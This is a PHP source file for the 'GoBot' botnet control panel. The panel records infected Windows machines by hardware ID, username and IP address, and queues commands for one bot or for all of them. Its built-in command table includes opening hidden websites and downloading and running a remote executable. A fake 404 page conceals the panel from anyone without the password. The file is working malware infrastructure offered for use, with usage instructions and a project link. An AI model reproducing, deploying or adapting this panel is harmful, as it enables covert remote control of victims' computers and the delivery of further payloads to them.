<?php
$PanelPassword = "key"; //Letters and Numbers Only

$SQLName     = "localhost";
$SQLUser     = "root";
$SQLPassword = "";
$SQLDatabase = "gobots";


$conn = new mysqli($SQLName, $SQLUser, $SQLPassword, $SQLDatabase);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

?>

<?php
if (isset($_REQUEST["get"])):
    $tmpdat = mysql_real_escape_string($_REQUEST["get"]);
    $sql    = "SELECT Command FROM bots WHERE HWID='$tmpdat'";
    $result = $conn->query($sql);
    if ($result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            echo $row["Command"];
        }
    } else {
        echo "Bot does not exist.";
    }
?>
<?php
elseif (isset($_REQUEST["cmd"]) && $_REQUEST["cmd"] == $PanelPassword):
    $per_page = 10;
    if ($result = $conn->query("SELECT * FROM bots ORDER BY id")) {
        if ($result->num_rows != 0) {
            $total_results = $result->num_rows;
            $total_pages   = ceil($total_results / $per_page);
            if (isset($_GET['page']) && is_numeric($_GET['page'])) {
                $show_page = $_GET['page'];
                if ($show_page > 0 && $show_page <= $total_pages) {
                    $start = ($show_page - 1) * $per_page;
                    $end   = $start + $per_page;
                } else {
                    $start = 0;
                    $end   = $per_page;
                }
            } else {
                $start = 0;
                $end   = $per_page;
            }
            echo "<center><h1>GoBot Control Panel</h1><br/>";
            echo "<table border='1' cellpadding='10'>";
            echo "<tr><th>HWID</th> <th>Username</th> <th>Windows</th> <th>IP</th> <th>Options</th></tr>";
            for ($i = $start; $i < $end; $i++) {
                if ($i == $total_results) {
                    break;
                }
                $result->data_seek($i);
                $row = $result->fetch_row();
                echo "<tr>";
                echo '<td>' . $row[1] . '</td>';
                echo '<td>' . $row[2] . '</td>';
                echo '<td>' . $row[3] . '</td>';
                echo '<td>' . $row[4] . '</td>';
                echo "<td><a href='$_SERVER[REQUEST_URI]&command=$row[1]'>Command</a> | <a href='$_SERVER[REQUEST_URI]&delete=$row[1]'>Delete</a></td>";
                echo "</tr>";
            }
            echo "</table>";
            echo "<center><p><b>View Page:</b> ";
            for ($i = 1; $i <= $total_pages; $i++) {
                if (isset($_GET['page']) && $_GET['page'] == $i) {
                    echo $i . " ";
                } else {
                    echo "<a href='$_SERVER[REQUEST_URI]&page=$i'>$i</a> ";
                }
            }
            echo "</p>";
            echo "<form method=\"post\" action=\"http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\">\n";
            echo "<input type=\"text\" name=\"command\"><br>\n";
			echo "	 <input type=\"hidden\" name=\"hwid\" value=\"ALL\" /><br>\n";
            echo "<input type=\"submit\" name=\"submitall\" value=\"Send Command to All\"><br>\n";
            echo "</form></center>\n";
        } else {
            echo "<center>No results to display!</center>";
        }
    } else {
        echo "Error: " . $mysqli->error;
    }
    if (isset($_POST['submit'])) //Single Bot
        {
        $raw_tmp = mysql_real_escape_string($_REQUEST["command"]);
		$raw_tmp2 = mysql_real_escape_string($_REQUEST["hwid"]);
        $enc_tmp = base64_encode($raw_tmp2."|".$raw_tmp);
		
        if ($stmt = $conn->prepare("UPDATE bots SET command='$enc_tmp' WHERE HWID = ? LIMIT 1")) {
            $stmt->bind_param("s", $raw_tmp2);
            $stmt->execute();
            $stmt->close();
			echo "<strong>Command: </strong><i>" . $raw_tmp . " </i><strong>Sent!</strong><br/>";
        	$url = strtok($_SERVER["REQUEST_URI"], '?');
        	$key = $_REQUEST["cmd"];
        	echo "<strong>Refresh Page: </strong> <a href='$url?cmd=$key'>HERE</a>";
        } else {
            echo "ERROR: could not prepare SQL statement.";
        }
    } elseif (isset($_POST['submitall'])) //All Bots
        {
        $raw_tmp = mysql_real_escape_string($_REQUEST["command"]);
		$raw_tmp2 = mysql_real_escape_string($_REQUEST["hwid"]);
        $enc_tmp = base64_encode($raw_tmp2."|".$raw_tmp);    
        if ($stmt = $conn->prepare("UPDATE bots SET command='$enc_tmp'")) {;
            $stmt->execute();
            $stmt->close();
			echo "<strong>Command: </strong><i>" . $raw_tmp . " </i><strong>Sent!</strong><br/>";
        	$url = strtok($_SERVER["REQUEST_URI"], '?');
        	$key = $_REQUEST["cmd"];
        	echo "<strong>Refresh Page: </strong> <a href='$url?cmd=$key'>HERE</a>";
        } else {
            echo "ERROR: could not prepare SQL statement.";
        }
    } elseif (isset($_REQUEST["command"])) {
        $tmpid = $_REQUEST["command"];
        echo "<strong>Target:</strong> <i>$tmpid</i>";
        echo "<form method=\"post\" action=\"http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\">\n";
        echo "   <input type=\"text\" name=\"command\"><br>\n";
		echo "	 <input type=\"hidden\" name=\"hwid\" value=\"$tmpid\" /><br>\n";
        echo "   <input type=\"submit\" name=\"submit\" value=\"Send Command to $tmpid\"><br>\n";
        echo "</form>\n";
        
    } elseif (isset($_REQUEST["delete"])) {
        $id = $_REQUEST["delete"];
        if ($stmt = $conn->prepare("DELETE FROM bots WHERE HWID = ? LIMIT 1")) {
            $stmt->bind_param("s", $id);
            $stmt->execute();
            $stmt->close();
        } else {
            echo "ERROR: could not prepare SQL statement.";
        }
        echo "<strong>Bot deleted!</strong><br/>";
        $url = strtok($_SERVER["REQUEST_URI"], '?');
        $key = $_REQUEST["cmd"];
        echo "<strong>Refresh Page: </strong> <a href='$url?cmd=$key'>HERE</a>";
    }
?>
<center><table width="50%" border="1">
  <caption>
    <h2>GoBot Commands</h2>
  </caption>
  <tbody>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Command</th>
      <th scope="col">Example</th>
    </tr>
    <tr>
      <td><center>Open Website Visable</center></td>
      <td><center>1|{URL}|V</center></td>
      <td><center>1|www.google.com|V</center></td>
    </tr>
    <tr>
      <td><center>
      Open Website Hidden
      </center></td>
      <td><center>
      1|{URL}|H
      </center></td>
      <td><center>
        1|www.google.com|H
      </center></td>
    </tr>
    <tr>
      <td><center>
      Show Message Box
      </center></td>
      <td><center>
      2|{TITLE}|{MESSAGE}
      </center></td>
      <td><center>
      2|GoBot|Hello World!
      </center></td>
    </tr>
    <tr>
      <td><center>
      Kill GoBot
      </center></td>
      <td><center>
      0
      </center></td>
      <td><center>
      0
      </center></td>
    </tr>
       <tr>
      <td><center>Start Program</center></td>
      <td><center>3|{PROGRAMNAME}.exe</center></td>
      <td><center>3|calc.exe</center></td>
    </tr>
        <tr>
      <td><center>Download and Run</center></td>
      <td><center>4|{URLTOEXE}</center></td>
      <td><center>4|http://filehost.com/file.exe</center></td>
    </tr>
      <tr>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
  </tbody>
</table>
  <h2>How to use</h2>
<br/>
Once a bot is running it will connect to the Control panel, it will send its information and then wait for orders.
<br/>
To command a single bot, find it on the list and select "Command". This will bring up a new command box with the bots HWID aready in, just enter your command like you see it on the command list.
<br/>
To command all bots just enter the command in the "Send Command to All" field.
<br/>
<br/>
<strong>Project Github:</strong> <a href="https://github.com/SaturnsVoid/GoBot/" target="new">Github.com</a>
</center>
<?php
elseif (isset($_REQUEST["INFO"]) || isset($_REQUEST["HWID"]) || isset($_REQUEST["USERNAME"]) || isset($_REQUEST["WINDOWS"])):
    $tmpdatA = mysql_real_escape_string($_REQUEST["HWID"]);
    $tmpdatB = mysql_real_escape_string($_REQUEST["USERNAME"]);
    $tmpdatC = mysql_real_escape_string($_REQUEST["WINDOWS"]);
    $tmpdatD = mysql_real_escape_string($_SERVER['REMOTE_ADDR']);
    $query   = mysqli_query($conn, "SELECT Command FROM bots WHERE HWID='$tmpdatA'");
    if (mysqli_num_rows($query) > 0) {
        
        echo "Already Exists";
    } else {
        $sql = "INSERT INTO bots (HWID, Username, Windows, IP) VALUES ('$tmpdatA', '$tmpdatB', '$tmpdatC', '$tmpdatD')";
        if ($conn->query($sql) === TRUE) {
            echo "New record created successfully";
        } else {
            echo "Error: " . $sql . "<br>" . $conn->error;
        }
    }
?>
 
<?php
else:
?>
   <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">
    <HTML><HEAD>
    <TITLE>404 Not Found</TITLE>
    </HEAD><BODY>
    <H1>Not Found</H1>
    The requested URL was not found on this server.
    </BODY></HTML>
<?php
endif;
?>
